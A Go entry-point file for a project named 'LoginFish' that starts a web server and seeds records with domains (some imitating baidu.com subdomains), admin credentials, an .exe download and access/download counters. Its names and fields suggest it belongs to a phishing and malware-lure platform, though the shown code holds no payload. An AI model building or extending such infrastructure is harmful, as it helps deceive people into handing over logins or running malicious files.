package main

import (
	"LoginFish/pkg/model"
	_ "LoginFish/pkg/model"
	"LoginFish/pkg/router"
	_ "LoginFish/pkg/router"
	"fmt"
	"log"
	"net/http"
	"os"
)

func testdata() {
	site := model.Site{
		UUID:          "",
		Domain:        "127.0.0.1",
		Title:         "123123",
		UserName:      "admin",
		PassWord:      "12345",
		Download:      "asdasd.exe",
		AccessCount:   0,
		DownloadCount: 0,
	}
	model.Conn.Save(&site)
	return

	for i := 0; i < 10; i++ {
		log.Println(i)
		site := model.Site{
			UUID:          "",
			Domain:        fmt.Sprintf("site-%d.baidu.com", i),
			Title:         fmt.Sprintf("site-%d.baidu.com", i),
			UserName:      "admin",
			PassWord:      "12345",
			Download:      "asdasd.exe",
			AccessCount:   0,
			DownloadCount: 0,
		}
		model.Conn.Save(&site)
	}
}
func main() {
	//testdata()
	// if len(os.Args) > 1 && os.Args[1] == "init" {
	// 	testdata()
	// 	return
	// }
	port := "5522"
	if len(os.Args) > 1 {
		port = os.Args[1]
	}
	router.Router.LoadHTMLGlob("static/template/*.html")
	srv := &http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: router.Router,
	}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalln("Listen Webapi Error : ", err)
		panic(err)
	}

}
